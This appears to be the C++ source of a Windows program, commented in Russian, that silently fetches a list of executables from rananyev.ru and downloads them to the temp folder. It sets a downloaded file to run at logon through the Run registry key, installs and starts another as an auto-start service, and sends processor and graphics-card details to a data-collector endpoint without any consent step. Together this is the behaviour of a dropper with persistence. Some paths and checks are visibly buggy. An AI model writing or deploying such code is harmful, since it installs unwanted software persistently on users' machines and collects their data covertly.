#include "stdafx.h"
#include <iostream>
#include "windows.h"
#include <wininet.h>
#include <fstream>
#include <atlstr.h> //MayBeLater
#include <urlmon.h>
#include <tlhelp32.h>
#include <Wincrypt.h> //MayBeLater
#include <WbemCli.h>
#include <VersionHelpers.h>
#include <string>

#pragma comment(lib, "wbemuuid.lib")  
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"wininet")

//#define BUFSIZE 1024
//#define MD5LEN  16


#pragma region MayBeNeededLater/*
//Определение битности. Взял кусок кода отсюда: https://support.microsoft.com/en-gb/kb/2060044


std::string readHashFromFile(const char* filepath)
{
	char chh;
	std::string res = "00112233445566778899aabbccddeeff";
	std::ifstream txtfile("serviceapp.txt");
	if (txtfile.is_open())
	{
		std::cout << "open\n";
		while (txtfile.get(chh))
			std::cout << chh << "lol";
		system("pause");
	}
	for (int i = 0; i < 32; ++i)
	{

		res[i] = txtfile.get();
		std::cout << res[i] << " " << txtfile.get();
		system("pause"); 
	}
	return res;
}



//md5 файла
std::string Filemd5(const CString& nameOfFile)
{
	std::string resmd5 = "00112233445566778899aabbccddeeff"; // костыли&велосипеды вперде
	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	HCRYPTPROV hProv = 0;
	HCRYPTHASH hHash = 0;
	HANDLE hFile = NULL;
	BYTE rgbFile[BUFSIZE];
	DWORD cbRead = 0;
	BYTE rgbHash[MD5LEN];
	DWORD cbHash = 0;
	CHAR rgbDigits[] = "0123456789abcdef";
	LPCWSTR filename = (LPCTSTR)nameOfFile;
	// Logic to check usage goes here.

	hFile = CreateFile(filename,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_SEQUENTIAL_SCAN,
		NULL);

	if (INVALID_HANDLE_VALUE == hFile)
	{
		dwStatus = GetLastError();
		printf("Error opening file %s\nError: %d\n", filename,
			dwStatus);
		return (char*)dwStatus;
	}

	// Get handle to the crypto provider
	if (!CryptAcquireContext(&hProv,
		NULL,
		NULL,
		PROV_RSA_FULL,
		CRYPT_VERIFYCONTEXT))
	{
		dwStatus = GetLastError();
		printf("CryptAcquireContext failed: %d\n", dwStatus);
		CloseHandle(hFile);
		return (char*)dwStatus;
	}

	if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))
	{
		dwStatus = GetLastError();
		printf("CryptAcquireContext failed: %d\n", dwStatus);
		CloseHandle(hFile);
		CryptReleaseContext(hProv, 0);
		return (char*)dwStatus;
	}

	while (bResult = ReadFile(hFile, rgbFile, BUFSIZE,
		&cbRead, NULL))
	{
		if (0 == cbRead)
		{
			break;
		}

		if (!CryptHashData(hHash, rgbFile, cbRead, 0))
		{
			dwStatus = GetLastError();
			printf("CryptHashData failed: %d\n", dwStatus);
			CryptReleaseContext(hProv, 0);
			CryptDestroyHash(hHash);
			CloseHandle(hFile);
			return (char*)dwStatus;
		}
	}

	if (!bResult)
	{
		dwStatus = GetLastError();
		printf("ReadFile failed: %d\n", dwStatus);
		CryptReleaseContext(hProv, 0);
		CryptDestroyHash(hHash);
		CloseHandle(hFile);
		return (char*)dwStatus;
	}

	cbHash = MD5LEN;
	if (CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0))
	{
		//printf("MD5 hash of file %s is: ", filename);
		for (unsigned int i = 0; i < cbHash; i++)
		{
			//printf("%c%c", rgbDigits[rgbHash[i] >> 4],
				//rgbDigits[rgbHash[i] & 0xf]);
			resmd5[2 * i] = rgbDigits[rgbHash[i] >> 4];
			//std::cout << resmd5[2*i];
			resmd5[2 * i + 1] = rgbDigits[rgbHash[i] & 0xf];
		}
		printf("\n");
	}
	else
	{
		dwStatus = GetLastError();
		printf("CryptGetHashParam failed: %d\n", dwStatus);
	}

	CryptDestroyHash(hHash);
	CryptReleaseContext(hProv, 0);
	CloseHandle(hFile);
	//std::cout << resmd5;
	return resmd5;
}

bool ProcessRunning(const WCHAR* name)
{
	HANDLE SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (SnapShot == INVALID_HANDLE_VALUE)
		return false;

	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(SnapShot, &procEntry))
		return false;

	do
	{
		if (wcscmp(procEntry.szExeFile, name) == 0)
			return true;
	} while (Process32Next(SnapShot, &procEntry));

	return false;
}
*/
#pragma endregion

#pragma region Is64BitOperatingSystem()
//   FUNCTION: DoesWin32MethodExist(PCWSTR, PCSTR)
//
//   PURPOSE: The function determins whether a method exists in the export 
//   table of a certain module.
//
//   PARAMETERS:
//   * pszModuleName - the name of the module.
//   * pszMethodName - the name of the method.
//
//   RETURN VALUE: The function returns TRUE if the method specified by 
//   methodName exists in the export table of the module specified by 
//   moduleName.
//
BOOL DoesWin32MethodExist(PCWSTR pszModuleName, PCSTR pszMethodName)
{
	HMODULE hModule = GetModuleHandle(pszModuleName);
	if (hModule == NULL)
	{
		return FALSE;
	}
	return (GetProcAddress(hModule, pszMethodName) != NULL);
}


//
//   FUNCTION: Is64BitOperatingSystem()
//
//   PURPOSE: The function determines whether the current operating system is 
//   a 64-bit operating system.
//
//   RETURN VALUE: The function returns TRUE if the operating system is 
//   64-bit; otherwise, it returns FALSE.
//
BOOL Is64BitOperatingSystem()
{
#if defined(_WIN64)
	return TRUE;   // 64-bit programs run only on Win64
#elif defined(_WIN32)
	// 32-bit programs run on both 32-bit and 64-bit Windows
	BOOL f64bitOS = FALSE;
	return ((DoesWin32MethodExist(L"kernel32.dll", "IsWow64Process") &&
		IsWow64Process(GetCurrentProcess(), &f64bitOS)) && f64bitOS);
#else
	return FALSE;  // 64-bit Windows does not support Win16
#endif
}
#pragma endregion

//Чтение ссылки на exe сервиса и сохранение md5 и ссылки в файл
std::wstring readServiceUrl()
{
	std::wstring result = L"";
	// инициализируем WinInet
	HINTERNET hInternet =
		::InternetOpen(
		TEXT("WinInet Test"),
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL, NULL,
		0);
	if (hInternet != NULL) {
		// открываем HTTP сессию
		HINTERNET hConnect =
			::InternetConnect(
			hInternet,
			TEXT("rananyev.ru"),
			INTERNET_DEFAULT_HTTP_PORT,
			NULL, NULL,
			INTERNET_SERVICE_HTTP,
			0,
			1u);

		if (hConnect != NULL) {
			// открываем запрос
			HINTERNET hRequest =
				::HttpOpenRequest(
				hConnect,
				TEXT("GET"),
				TEXT("/iuservice/serviceapp/"),
				NULL,
				NULL,
				0,
				INTERNET_FLAG_KEEP_CONNECTION,
				1);

			if (hRequest != NULL) {
				// посылаем запрос
				BOOL bSend = ::HttpSendRequest(hRequest, NULL, 0, NULL, 0);
				if (bSend) {
					// создаём выходной файл
					TCHAR szTempPathBuffer[MAX_PATH];
					GetTempPath(MAX_PATH, szTempPathBuffer);
					std::wstring filePath = szTempPathBuffer;
					filePath += L"\serviceapp.txt";
					std::ofstream fnews(filePath, std::ios::out | std::ios::binary);
					BOOL urlread = FALSE;
					std::string urlReading = "";
					if (fnews.is_open()) for (;;) {
						// читаем данные
						char  szData[1024];
						DWORD dwBytesRead;
						BOOL bRead = ::InternetReadFile(hRequest, szData, sizeof(szData)-1, &dwBytesRead);
						// выход из цикла при ошибке или завершении
						if (bRead == FALSE || dwBytesRead == 0)
							break;
						if (urlread == FALSE)
						{
							int i = 33;
							while (szData[i] != '\n')
							{
								urlReading.append(1, szData[i]);
								++i;
							}
							urlread = TRUE;
						}
						// сохраняем результат
						szData[dwBytesRead] = 0;
						fnews << szData;
					}
					std::wstring resUrl(urlReading.begin(), urlReading.end());
					result = resUrl;
				}
				//else { std::cout << "req" << std::endl; std::cout << GetLastError(); }
				// закрываем запрос
				::InternetCloseHandle(hRequest);
			}
			//else std::cout << "ses" << std::endl;
			// закрываем сессию
			::InternetCloseHandle(hConnect);
		}
		//else std::cout << "WinInet" << std::endl;
		// закрываем WinInet
		::InternetCloseHandle(hInternet);
	}

	return result;
}

//Чтение ссылок на exe приложений и сохранение id, названия, ссылки и md5 в файл listapp.txt для каждого приложения
//Работает только с небольшим количеством ссылок (точно не больше 10, но лучше меньше (сейчас 8)), после последней ссылки на сайте должно быть 2 '\n'
//Для большего количества надо увеличить количество чаров в szData и поменять восьмёрку в начале этой фугкции и в цикле мейна.
std::wstring* readAppsUrls(const std::string version)
{
	std::wstring* result = new std::wstring[8]; //8 ссылок
	std::wstring wversion(version.begin(), version.end());
	wversion = L"/iuservice/applist/" + wversion + L".txt";
	// инициализируем WinInet
	HINTERNET hInternet =
		::InternetOpen(
		TEXT("WinInet Test"),
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL, NULL,
		0);
	if (hInternet != NULL) {
		// открываем HTTP сессию
		HINTERNET hConnect =
			::InternetConnect(
			hInternet,
			TEXT("rananyev.ru"),
			INTERNET_DEFAULT_HTTP_PORT,
			NULL, NULL,
			INTERNET_SERVICE_HTTP,
			0,
			1u);

		if (hConnect != NULL) {
			// открываем запрос
			HINTERNET hRequest =
				::HttpOpenRequest(
				hConnect,
				TEXT("GET"),
				wversion.c_str(),
				NULL,
				NULL,
				0,
				INTERNET_FLAG_KEEP_CONNECTION,
				1);

			if (hRequest != NULL) {
				// посылаем запрос
				BOOL bSend = ::HttpSendRequest(hRequest, NULL, 0, NULL, 0);
				if (bSend) {
					// создаём выходной файл
					TCHAR szTempPathBuffer[MAX_PATH];
					GetTempPath(MAX_PATH, szTempPathBuffer);
					std::wstring filePath = szTempPathBuffer;
					filePath += L"\listapp.txt";
					std::ofstream applist(filePath, std::ios::out | std::ios::binary);
					std::string urlReading = "";
					if (applist.is_open()) for (;;) {
						// читаем данные
						char  szData[1024];
						DWORD dwBytesRead;
						BOOL bRead = ::InternetReadFile(hRequest, szData, sizeof(szData)-1, &dwBytesRead);
						// выход из цикла при ошибке или завершении
						if (bRead == FALSE || dwBytesRead == 0)
							break;
						int lines = 0;
						int i = 0;
						for (;;)
						{
							urlReading.clear();
							for (int dotCommaCount = 0; dotCommaCount < 1; ++dotCommaCount)
							{
								
								while (szData[i] != ';')
								{
									++i;
								}
								++i;
							}
							while (szData[i] != ';')
							{
								urlReading.append(1, szData[i]);
								++i;
							}
							urlReading.append(1, szData[i]);
							++i;
							while (szData[i] != ';')
							{
								urlReading.append(1, szData[i]);
								++i;
							}
							std::wstring resUrl(urlReading.begin(), urlReading.end());
							resUrl += L"\0";
							*(result + lines) = resUrl;
							++lines;
							while (szData[i] != '\n')
							{
								++i;
							}
							++i;
							if (szData[i] == '\n' || i > 1023) break;
						}
						
						// сохраняем результат
						szData[dwBytesRead] = 0;
						applist << szData;
					}
					
				}
				else { std::cout << "req" << std::endl; std::cout << GetLastError(); }
				// закрываем запрос
				::InternetCloseHandle(hRequest);
			}
			else std::cout << "ses" << std::endl;
			// закрываем сессию
			::InternetCloseHandle(hConnect);
		}
		else std::cout << "WinInet" << std::endl;
		// закрываем WinInet
		::InternetCloseHandle(hInternet);
	}

	return result;
}

//POST запрос (sort of). Для того, чтобы работало, надо убрать 123 в открытии запроса
int postInfo(const std::string version)
{
	//Узнаём процессор у видюху
	std::wstring wver(version.begin(), version.end());
	std::wstring Info = L"{Windows version:" + wver + L",";
	std::wstring hdrs = L"Content-Type: application/x-www-form-urlencoded";  //application/x-www-form-urlencoded  application/json\r\n
	HRESULT hRes = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hRes))
	{
		//std::cout << "Unable to launch COM: 0x" << std::hex << hRes << std::endl;
		return 1;
	}
	if ((FAILED(hRes = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, 0))))
	{
		//std::cout << "Unable to initialize security: 0x" << std::hex << hRes << std::endl;
		return 1;
	}
	IWbemLocator* pLocator = NULL;
	if (FAILED(hRes = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pLocator))))
	{
		//std::cout << "Unable to create a WbemLocator: " << std::hex << hRes << std::endl;
		return 1;
	}

	IWbemServices* pService = NULL;
	if (FAILED(hRes = pLocator->ConnectServer(L"root\\CIMV2", NULL, NULL, NULL, WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &pService)))
	{
		pLocator->Release();
		//std::cout << "Unable to connect to \"CIMV2\": " << std::hex << hRes << std::endl;
		return 1;
	}

	IEnumWbemClassObject* pEnumerator = NULL;
	if (FAILED(hRes = pService->ExecQuery(L"WQL", L"SELECT * FROM Win32_Processor", WBEM_FLAG_FORWARD_ONLY, NULL, &pEnumerator)))
	{
		pLocator->Release();
		pService->Release();
		//std::cout << "Unable to retrive processor: " << std::hex << hRes << std::endl;
		return 1;
	}

	IWbemClassObject* clsObj = NULL;
	int numElems;
	while ((hRes = pEnumerator->Next(WBEM_INFINITE, 1, &clsObj, (ULONG*)&numElems)) != WBEM_S_FALSE)
	{
		if (FAILED(hRes))
			break;

		VARIANT vRet;
		VariantInit(&vRet);
		if (SUCCEEDED(clsObj->Get(L"Name", 0, &vRet, NULL, NULL)) && vRet.vt == VT_BSTR)
		{
			Info += L"Processor name:";
			Info += vRet.bstrVal;
			Info += L",";
			VariantClear(&vRet);
		}
		if (SUCCEEDED(clsObj->Get(L"Description", 0, &vRet, NULL, NULL)) && vRet.vt == VT_BSTR)
		{
			Info += L"Processor description:";
			Info += vRet.bstrVal;
			Info += L",";
			VariantClear(&vRet);
		}

		clsObj->Release();
	}

	pEnumerator = NULL;
	if (FAILED(hRes = pService->ExecQuery(L"WQL", L"SELECT * FROM Win32_VideoController", WBEM_FLAG_FORWARD_ONLY, NULL, &pEnumerator)))
	{
		pLocator->Release();
		pService->Release();
		//std::cout << "Unable to retrive video controller: " << std::hex << hRes << std::endl;
		return 1;
	}

	clsObj = NULL;
	numElems;
	while ((hRes = pEnumerator->Next(WBEM_INFINITE, 1, &clsObj, (ULONG*)&numElems)) != WBEM_S_FALSE)
	{
		if (FAILED(hRes))
			break;

		VARIANT vRet;
		VariantInit(&vRet);
		if (SUCCEEDED(clsObj->Get(L"Name", 0, &vRet, NULL, NULL)) && vRet.vt == VT_BSTR)
		{
			Info += L"Video controller name:";
			Info += vRet.bstrVal;
			Info += L",";
			VariantClear(&vRet);
		}

		clsObj->Release();
	}
	Info.pop_back();
	Info += L"}";
	pEnumerator->Release();
	pService->Release();
	pLocator->Release();
	//std::wcout << Info.c_str() << "\t" << sizeof(WCHAR)*Info.length() << std::endl;

	// инициализируем WinInet
	HINTERNET hInternet =
		::InternetOpen(
		Info.c_str(),
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL, NULL,
		0);
	if (hInternet != NULL) {
		// открываем HTTP сессию
		HINTERNET hConnect =
			::InternetConnect(
			hInternet,
			TEXT("rananyev.ru"),
			INTERNET_DEFAULT_HTTP_PORT,
			NULL, NULL,
			INTERNET_SERVICE_HTTP,
			0,
			1u);

		if (hConnect != NULL) {
			// открываем запрос
			HINTERNET hRequest =
				::HttpOpenRequest(
				hConnect,
				TEXT("GET"),
				TEXT("/iuservice/datacollector123/"), //здесь убрать 123
				NULL,
				NULL,
				NULL,
				INTERNET_FLAG_RELOAD,
				1);

			
			if (hRequest != NULL) {
				// посылаем запрос

				BOOL bSend = ::HttpSendRequest(hRequest, hdrs.c_str(), -1L, (LPVOID)Info.c_str(), sizeof(WCHAR)*Info.length());

				::InternetCloseHandle(hRequest);
			}
			//else std::cout << "ses" << std::endl;
			// закрываем сессию
			::InternetCloseHandle(hConnect);
		}
		//else std::cout << "WinInet" << std::endl;
		// закрываем WinInet
		::InternetCloseHandle(hInternet);
	}

	return 0;
}

//Установка и запуск сервиса
BOOL InstallAndStartService(const CString& strServiceName, const CString& strDisplayName, const CString& strBinaryPathName)
{
	BOOL bResult = FALSE;

	SC_HANDLE hServiceControlManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (NULL != hServiceControlManager)
	{
		SC_HANDLE hService = CreateService(hServiceControlManager,
			(LPCTSTR)strServiceName,
			(LPCTSTR)strDisplayName,
			SC_MANAGER_ALL_ACCESS,
			SERVICE_WIN32_OWN_PROCESS,
			SERVICE_AUTO_START,
			SERVICE_ERROR_NORMAL,
			(LPCTSTR)strBinaryPathName,
			0,
			0,
			0,
			0,
			0);
		if (hService != NULL)
		{
			StartService(hService, NULL, NULL);
			bResult = TRUE;
			CloseServiceHandle(hService);
		}

		CloseServiceHandle(hServiceControlManager);
	}

	return bResult;
}

/*BOOL StopAndDeleteService(const CString& strServiceName)
{
	BOOL bResult = FALSE;

	SC_HANDLE hServiceControlManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (NULL != hServiceControlManager)
	{
		SC_HANDLE hService = OpenService(hServiceControlManager, (LPCTSTR)strServiceName, SC_MANAGER_ALL_ACCESS);
		if (hService != NULL)
		{
			ControlService(hService, SERVICE_CONTROL_STOP, NULL);
			DeleteService(hService);
			bResult = TRUE;
			CloseServiceHandle(hService);
		}

		CloseServiceHandle(hServiceControlManager);
	}

	return bResult;
}*/

//Получение версии винды
std::string getVersion()
{
	std::string version;
	if (IsWindowsXPOrGreater())
	{
		version = "";
		version += "xp_";
	}
	if (IsWindowsVistaOrGreater())
	{
		version = "";
		version += "vista_";
	}
	if (IsWindows7OrGreater())
	{
		version = "";
		version += "7_";
	}
	if (IsWindows8OrGreater())
	{
		version = "";
		version += "8_";
	}
	if (Is64BitOperatingSystem)
		version += "64";
	else
		version += "32";
	return version;
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd)
//int _tmain(int argc, _TCHAR* argv[])
{
	std::string version = getVersion();
	std::wstring serviceUrl = readServiceUrl();
	std::wstring* allUrls = readAppsUrls(version);
	std::wstring appName;
	std::wstring appUrl;
	postInfo(version);
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath, MAX_PATH);
	HKEY newValue;
	TCHAR szTempPathBuffer[MAX_PATH];
	GetTempPath(MAX_PATH, szTempPathBuffer);
	std::wstring filePath = szTempPathBuffer;
	filePath += L"\iuservice.exe";
	HRESULT hr1 = URLDownloadToFile(NULL, serviceUrl.c_str(), filePath.c_str(), 0, NULL);
	RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newValue);

	for (int i = 0; i < 8; ++i) //Должно быть <=8 строк
	{
		if (allUrls[i].length() > 0)
		{
			appName = L"";
			std::wstring singleUrl = allUrls[i];
			while (singleUrl.c_str()[0] != L';')
			{
				appName += singleUrl.c_str()[0];
				singleUrl.erase(singleUrl.begin());
			}
			singleUrl.erase(singleUrl.begin());
			filePath = szTempPathBuffer;
			filePath += L"\\" + appName;
			HRESULT hr2 = URLDownloadToFile(NULL, singleUrl.c_str(), filePath.c_str(), 0, NULL);
			RegSetValueEx(newValue, _T("Iservice"), 0, REG_SZ, (LPBYTE)filePath.c_str(), sizeof(LPBYTE)*filePath.size());
		}
	}
	RegCloseKey(newValue);
	
	filePath = szTempPathBuffer;
	filePath += L"\iuservice.exe";
	std::string servicePath(filePath.begin(), filePath.end());
	InstallAndStartService("IUservice", "IUservice", servicePath.c_str());
	
	//system("pause");
	return 0;
}